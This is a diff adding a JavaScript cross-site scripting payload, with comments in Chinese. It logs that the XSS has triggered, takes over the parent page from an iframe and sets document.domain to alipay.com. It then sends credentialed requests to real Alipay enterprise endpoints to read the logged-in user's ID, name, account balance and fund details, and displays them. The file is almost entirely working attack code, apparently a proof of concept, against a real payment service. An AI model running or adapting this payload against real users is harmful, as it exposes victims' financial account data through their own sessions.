@@ -1,0 +1,465 @@
+(function() {
+    // 获取父窗口
+    var parentWin = window.parent || parent;
+    var parentDoc = parentWin.document;
+    
+    // 日志函数 - 输出到父窗口
+    function addLog(message, type) {
+        try {
+            var logContainer = parentDoc.getElementById('logContainer');
+            if (!logContainer) {
+                // 如果日志容器不存在，先创建UI
+                initParentUI();
+                logContainer = parentDoc.getElementById('logContainer');
+            }
+            
+            if (logContainer) {
+                var logEntry = parentDoc.createElement('div');
+                logEntry.className = 'log-entry ' + (type || 'info');
+                var timestamp = new Date().toLocaleTimeString();
+                var icon = type === 'error' ? '❌' : type === 'success' ? '✅' : type === 'warning' ? '⚠️' : '📝';
+                logEntry.textContent = '[' + timestamp + '] ' + icon + ' ' + message;
+                logContainer.appendChild(logEntry);
+                logContainer.scrollTop = logContainer.scrollHeight;
+            }
+        } catch(e) {
+            console.error('添加日志失败:', e);
+        }
+        console.log('[' + type + '] ' + message);
+    }
+    
+    // 初始化父窗口UI
+    function initParentUI() {
+        try {
+            // 清空父窗口body
+            parentDoc.body.innerHTML = '';
+            parentDoc.body.style.cssText = 'margin: 0; padding: 20px; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;';
+            
+            // 创建样式
+            var style = parentDoc.createElement('style');
+            style.textContent = `
+                * {
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                }
+                body {
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+                    padding: 20px;
+                    margin: 0;
+                    background: #f5f5f5;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    background: white;
+                    padding: 30px;
+                    border-radius: 8px;
+                    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+                }
+                h1 {
+                    color: #1677ff;
+                    border-bottom: 3px solid #1677ff;
+                    padding-bottom: 10px;
+                    margin-bottom: 20px;
+                }
+                h2 {
+                    color: #333;
+                    margin-top: 30px;
+                    margin-bottom: 15px;
+                }
+                .log-container {
+                    background: #1f1f1f;
+                    color: #0f0;
+                    font-family: 'Courier New', monospace;
+                    font-size: 12px;
+                    padding: 15px;
+                    border-radius: 8px;
+                    margin-bottom: 20px;
+                    max-height: 300px;
+                    overflow-y: auto;
+                    border: 2px solid #0f0;
+                }
+                .log-entry {
+                    margin: 5px 0;
+                    padding: 3px 0;
+                    border-bottom: 1px solid #333;
+                }
+                .log-entry.error {
+                    color: #f00;
+                }
+                .log-entry.success {
+                    color: #0f0;
+                }
+                .log-entry.info {
+                    color: #0ff;
+                }
+                .log-entry.warning {
+                    color: #ff0;
+                }
+                .info-box {
+                    margin: 20px 0;
+                    padding: 15px;
+                    border-radius: 8px;
+                    border-left: 4px solid #1677ff;
+                }
+                .info-box.user {
+                    background: #f0f5ff;
+                }
+                .info-box.balance {
+                    background: #f6ffed;
+                    border-left-color: #52c41a;
+                }
+                .info-box.error {
+                    background: #fff2f0;
+                    border-left-color: #ff4d4f;
+                    color: #ff4d4f;
+                }
+                .loading {
+                    color: #1677ff;
+                }
+                .balance-amount {
+                    font-size: 32px;
+                    font-weight: bold;
+                    color: #52c41a;
+                    margin: 10px 0;
+                }
+                textarea {
+                    width: 100%;
+                    height: 400px;
+                    font-family: 'Courier New', monospace;
+                    font-size: 12px;
+                    padding: 10px;
+                    border: 1px solid #d9d9d9;
+                    border-radius: 4px;
+                    resize: vertical;
+                }
+                code {
+                    background: #f5f5f5;
+                    padding: 2px 6px;
+                    border-radius: 3px;
+                    font-family: 'Courier New', monospace;
+                }
+                .meta-info {
+                    background: #fafafa;
+                    padding: 10px;
+                    border-radius: 4px;
+                    font-size: 12px;
+                    color: #666;
+                    margin-bottom: 20px;
+                }
+                .step-indicator {
+                    background: #e6f7ff;
+                    padding: 10px;
+                    border-radius: 4px;
+                    margin: 10px 0;
+                    border-left: 4px solid #1677ff;
+                }
+            `;
+            parentDoc.head.appendChild(style);
+            
+            // 创建容器
+            var container = parentDoc.createElement('div');
+            container.className = 'container';
+            container.innerHTML = `
+                <h1>🔐 支付宝账户信息查询</h1>
+                <h2>📋 执行日志</h2>
+                <div id="logContainer" class="log-container">
+                    <div class="log-entry info">⏳ 初始化中...</div>
+                </div>
+                <div class="meta-info">
+                    <strong>执行环境:</strong><br>
+                    • Window Location: <code id="winLocation">检测中...</code><br>
+                    • Document Domain: <code id="docDomain">检测中...</code><br>
+                    • Origin: <code id="origin">检测中...</code><br>
+                    • Referer: <code id="referer">检测中...</code>
+                </div>
+                <h2>👤 用户信息</h2>
+                <div id="userInfo" class="info-box user loading">
+                    <p>⏳ 等待开始...</p>
+                </div>
+                <h2>💰 账户余额</h2>
+                <div id="balance" class="info-box balance loading">
+                    <p>⏳ 等待用户信息加载完成...</p>
+                </div>
+                <h2>📄 完整JSON数据</h2>
+                <textarea id="jsonData" placeholder="等待数据加载..." readonly></textarea>
+            `;
+            parentDoc.body.appendChild(container);
+            
+            addLog('父窗口UI初始化完成', 'success');
+        } catch(e) {
+            console.error('初始化父窗口UI失败:', e);
+        }
+    }
+    
+    // 加载jQuery到父窗口
+    function loadjQuery(callback) {
+        if (typeof parentWin.jQuery !== 'undefined') {
+            addLog('父窗口jQuery已存在', 'success');
+            if (callback) callback();
+            return;
+        }
+        
+        addLog('开始加载jQuery到父窗口...', 'info');
+        var jqueryScript = parentDoc.createElement('script');
+        jqueryScript.src = 'https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js';
+        jqueryScript.onload = function() {
+            addLog('jQuery加载成功', 'success');
+            if (callback) callback();
+        };
+        jqueryScript.onerror = function() {
+            addLog('jQuery加载失败', 'error');
+        };
+        parentDoc.head.appendChild(jqueryScript);
+    }
+    
+    // 初始化
+    addLog('🚀 XSS触发，开始执行...', 'info');
+    addLog('📍 当前在iframe中，所有操作将作用到父窗口', 'info');
+    
+    // 初始化父窗口UI
+    initParentUI();
+    
+    // 显示环境信息
+    setTimeout(function() {
+        try {
+            var winLocation = parentWin.location.href;
+            var docDomain = parentDoc.domain || 'N/A';
+            var origin = parentWin.location.origin || 'N/A';
+            var referer = parentDoc.referrer || 'N/A';
+            
+            addLog('当前执行环境检测:', 'info');
+            addLog('  - window.location: ' + winLocation, 'info');
+            addLog('  - document.domain: ' + docDomain, 'info');
+            addLog('  - window.origin: ' + origin, 'info');
+            addLog('  - document.referrer: ' + referer, 'info');
+            
+            var winLocationEl = parentDoc.getElementById('winLocation');
+            var docDomainEl = parentDoc.getElementById('docDomain');
+            var originEl = parentDoc.getElementById('origin');
+            var refererEl = parentDoc.getElementById('referer');
+            if (winLocationEl) winLocationEl.textContent = winLocation;
+            if (docDomainEl) docDomainEl.textContent = docDomain;
+            if (originEl) originEl.textContent = origin;
+            if (refererEl) refererEl.textContent = referer;
+            
+            // 设置document.domain（如果需要）
+            try {
+                parentDoc.domain = 'alipay.com';
+                addLog('document.domain 已设置为: alipay.com', 'success');
+            } catch(e) {
+                addLog('设置 document.domain 失败: ' + e.message, 'warning');
+            }
+        } catch(e) {
+            addLog('获取环境信息失败: ' + e.message, 'error');
+        }
+        
+        // 加载jQuery并开始执行
+        loadjQuery(function() {
+            setTimeout(function() {
+                main();
+            }, 500);
+        });
+    }, 100);
+    
+    // 主函数
+    function main() {
+        addLog('开始执行主流程', 'info');
+        addLog('步骤1: 准备请求用户信息...', 'info');
+        
+        // 获取用户信息
+        var userInfoUrl = 'https://enterpriseportal.alipay.com/pamir/login/queryLoginAccount.json';
+        
+        addLog('请求URL: ' + userInfoUrl, 'info');
+        addLog('Referer将自动设置为父窗口URL: ' + parentWin.location.href, 'info');
+        
+        try {
+            var userInfoEl = parentDoc.getElementById('userInfo');
+            if (userInfoEl) userInfoEl.innerHTML = '<div class="step-indicator">📡 正在请求用户信息...</div>';
+        } catch(e) {}
+        
+        // 使用父窗口的jQuery发送请求
+        if (typeof parentWin.jQuery === 'undefined') {
+            addLog('父窗口jQuery未加载，无法发送请求', 'error');
+            return;
+        }
+        
+        parentWin.jQuery.ajax({
+            url: userInfoUrl,
+            type: 'GET',
+            data: {
+                _output_charset: 'utf-8',
+                appScene: 'MRCH'
+            },
+            xhrFields: {
+                withCredentials: true
+            },
+            beforeSend: function(xhr) {
+                addLog('发送请求前准备...', 'info');
+                addLog('Referer将自动设置为: ' + parentWin.location.href, 'info');
+            },
+            success: function(data) {
+                addLog('用户信息获取成功', 'success');
+                addLog('响应数据: ' + JSON.stringify(data), 'info');
+                
+                try {
+                    var logonUserId = data.logonUserId;
+                    var logonName = data.logonName;
+                    
+                    addLog('解析用户ID: ' + logonUserId, 'success');
+                    addLog('解析用户名: ' + logonName, 'success');
+                    
+                    try {
+                        var userInfoEl = parentDoc.getElementById('userInfo');
+                        if (userInfoEl) {
+                            userInfoEl.className = 'info-box user';
+                            userInfoEl.innerHTML = '<div class="step-indicator">✅ 用户信息获取成功</div>' +
+                                '<p><strong>用户ID:</strong> <code>' + logonUserId + '</code></p>' +
+                                '<p><strong>用户名:</strong> ' + logonName + '</p>';
+                        }
+                    } catch(e) {}
+                    
+                    // 获取账户详情
+                    setTimeout(function() {
+                        getAccountDetail(logonUserId);
+                    }, 500);
+                } catch(e) {
+                    addLog('解析用户信息失败: ' + e.message, 'error');
+                    try {
+                        var userInfoEl = parentDoc.getElementById('userInfo');
+                        if (userInfoEl) {
+                            userInfoEl.className = 'info-box error';
+                            userInfoEl.innerHTML = '<p><strong>❌ 解析失败:</strong> ' + e.message + '</p>';
+                        }
+                    } catch(e2) {}
+                }
+            },
+            error: function(xhr, status, error) {
+                addLog('获取用户信息失败', 'error');
+                addLog('错误信息: ' + error, 'error');
+                addLog('状态码: ' + xhr.status, 'error');
+                addLog('响应内容: ' + (xhr.responseText ? xhr.responseText.substring(0, 200) : 'N/A'), 'error');
+                
+                try {
+                    var userInfoEl = parentDoc.getElementById('userInfo');
+                    if (userInfoEl) {
+                        userInfoEl.className = 'info-box error';
+                        userInfoEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
+                            '<p><strong>错误:</strong> ' + error + '</p>' +
+                            '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
+                            '<p style="font-size: 12px;">可能原因: 未登录、Cookie过期、或CORS限制</p>';
+                    }
+                } catch(e) {}
+            }
+        });
+    }
+    
+    function getAccountDetail(logonUserId) {
+        addLog('步骤2: 准备请求账户详情...', 'info');
+        
+        // 从Cookie中获取ctoken
+        var ctoken = 'ccc';
+        addLog('使用ctoken: ' + ctoken, 'info');
+        
+        var accountUrl = 'https://mbillexprod.alipay.com/enterprise/fundAccountDetail.json';
+        
+        addLog('请求URL: ' + accountUrl, 'info');
+        addLog('Referer将自动设置为父窗口URL: ' + parentWin.location.href, 'info');
+        
+        try {
+            var balanceEl = parentDoc.getElementById('balance');
+            if (balanceEl) balanceEl.innerHTML = '<div class="step-indicator">📡 正在请求账户余额...</div>';
+        } catch(e) {}
+        
+        // 使用父窗口的jQuery发送请求
+        if (typeof parentWin.jQuery === 'undefined') {
+            addLog('父窗口jQuery未加载，无法发送请求', 'error');
+            return;
+        }
+        
+        parentWin.jQuery.ajax({
+            url: accountUrl,
+            type: 'POST',
+            data: {
+                billUserId: logonUserId,
+                pageNum: 1,
+                pageSize: 50,
+                startDateInput: '2025-12-25 00:00:00',
+                endDateInput: '2025-12-26 00:00:00',
+                showType: 0,
+                accountType: '',
+                settleBillRadio: 1,
+                queryEntrance: 1,
+                querySettleAccount: false,
+                switchToFrontEnd: true,
+                ctoken: ctoken,
+                _output_charset: 'utf-8',
+                _input_charset: 'gbk'
+            },
+            xhrFields: {
+                withCredentials: true
+            },
+            beforeSend: function(xhr) {
+                addLog('发送请求前准备...', 'info');
+                addLog('Referer将自动设置为: ' + parentWin.location.href, 'info');
+            },
+            success: function(response) {
+                addLog('账户详情获取成功', 'success');
+                addLog('响应数据长度: ' + JSON.stringify(response).length + ' 字符', 'info');
+                
+                try {
+                    var balance = response.result.detail[0].balance;
+                    
+                    addLog('解析账户余额: ¥' + balance, 'success');
+                    
+                    try {
+                        var balanceEl = parentDoc.getElementById('balance');
+                        if (balanceEl) {
+                            balanceEl.className = 'info-box balance';
+                            balanceEl.innerHTML = '<div class="step-indicator">✅ 账户余额获取成功</div>' +
+                                '<div class="balance-amount">¥ ' + balance + '</div>' +
+                                '<p style="color: #666; font-size: 14px;">查询时间: ' + new Date().toLocaleString() + '</p>';
+                        }
+                        var jsonDataEl = parentDoc.getElementById('jsonData');
+                        if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
+                    } catch(e) {}
+                    
+                    addLog('完整JSON数据已显示在文本框中', 'success');
+                    addLog('所有请求完成！', 'success');
+                } catch(e) {
+                    addLog('解析账户详情失败: ' + e.message, 'error');
+                    addLog('错误堆栈: ' + (e.stack ? e.stack.substring(0, 200) : 'N/A'), 'error');
+                    try {
+                        var balanceEl = parentDoc.getElementById('balance');
+                        if (balanceEl) {
+                            balanceEl.className = 'info-box error';
+                            balanceEl.innerHTML = '<div class="step-indicator">❌ 解析失败</div>' +
+                                '<p><strong>错误:</strong> ' + e.message + '</p>';
+                        }
+                        var jsonDataEl = parentDoc.getElementById('jsonData');
+                        if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
+                    } catch(e2) {}
+                }
+            },
+            error: function(xhr, status, error) {
+                addLog('获取账户详情失败', 'error');
+                addLog('错误信息: ' + error, 'error');
+                addLog('状态码: ' + xhr.status, 'error');
+                addLog('响应内容: ' + (xhr.responseText ? xhr.responseText.substring(0, 200) : 'N/A'), 'error');
+                
+                try {
+                    var balanceEl = parentDoc.getElementById('balance');
+                    if (balanceEl) {
+                        balanceEl.className = 'info-box error';
+                        balanceEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
+                            '<p><strong>错误:</strong> ' + error + '</p>' +
+                            '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
+                            '<p style="font-size: 12px;">可能原因: ctoken无效、未登录、或CORS限制</p>';
+                    }
+                } catch(e) {}
+            }
+        });
+    }
+})();
+
